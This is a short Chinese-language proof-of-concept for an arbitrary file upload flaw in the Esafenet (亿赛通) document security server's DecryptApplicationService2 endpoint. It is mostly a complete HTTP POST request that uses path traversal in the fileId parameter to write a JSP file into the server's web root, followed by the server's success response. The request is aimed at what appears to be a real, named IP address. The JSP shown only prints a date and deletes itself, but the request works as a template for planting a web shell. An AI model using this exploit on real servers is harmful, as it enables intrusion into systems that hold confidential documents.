# 亿赛通电子文档安全管理系统 DecryptApplicationService2 任意文件上传漏洞

    ## poc

http://171.221.235.168:88/CDGServer3/12345.jsp

```
POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/12345.jsp HTTP/1.1
Host: 171.221.235.168:88
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko)
Chrome/104.0.0.0 Safari/537.36 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,app
lication/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=E3B40EDFAC72A292489DBF7019B4AEA6 Connection: close
Content-Length: 273

<%@page import="java.text.*,java.util.*,java.io.*"%>
<%
SimpleDateFormat df = new SimpleDateFormat("yyy-MM-dd HH:mm:ss"); out.println(df.format(new Date()));
out.println("aaa");
File file = new File(application.getRealPath(request.getServletPath())); file.delete();
%>


HTTP/1.1 200 
Set-Cookie: JSESSIONID=8104BF8F2B4BF11989168FBB26A100E0; Path=/CDGServer3; HttpOnly
Content-Length: 0
Date: Fri, 18 Aug 2023 07:40:05 GMT
```
